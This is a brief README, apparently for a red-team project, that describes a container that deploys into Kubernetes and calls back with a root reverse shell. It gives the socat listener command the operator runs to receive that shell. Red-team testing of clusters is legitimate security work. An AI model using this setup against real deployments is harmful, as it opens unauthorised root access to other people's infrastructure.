# redteam-gkpown
Reverse shell container for k8s deployments

Run this on your local machine and wait for the container to deploy and call back with a root shell:

socat file:`tty`,raw,echo=0 tcp-listen:9532
